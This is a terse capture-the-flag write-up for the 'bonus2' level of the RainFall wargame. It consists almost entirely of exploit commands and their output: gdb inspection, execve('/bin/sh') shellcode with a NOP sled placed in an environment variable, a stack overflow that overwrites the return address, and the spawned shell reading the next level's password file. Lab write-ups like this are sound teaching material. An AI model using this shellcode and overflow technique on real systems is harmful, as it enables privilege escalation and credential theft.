# BONUS2

```
(gdb) x/s 0x804873d
0x804873d:       "fi"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA(gdb) x/s 0x8048740
0x8048740:       "nl"
```


```
bonus2@RainFall:~$ env -i shellcode=$(python -c 'print("\x90" *100 + "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")')  gdb bonus2
```

```
env -i shellcode=$(python -c 'print("\x90" * 100 + "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")') ./bonus2

```

0xbffffed0

```
env -i LANG=nl shellcode=$(python -c 'print("\x90" * 300 + "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")') ./bonus2 $(python -c 'print("A" * 40)') $(python -c 'print("B" * 19 + "\xd0\xfe\xff\xbf")
```

```
bonus2@RainFall:~$ env -i LANG=nl shellcode=$(python -c 'print("\x90" * 300 + "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")') ./bonus2 $(python -c 'print("A" * 40)') $(python -c 'print("B" * 23 + "\xd0\xfe\xff\xbf")')
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBB����
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
``` 
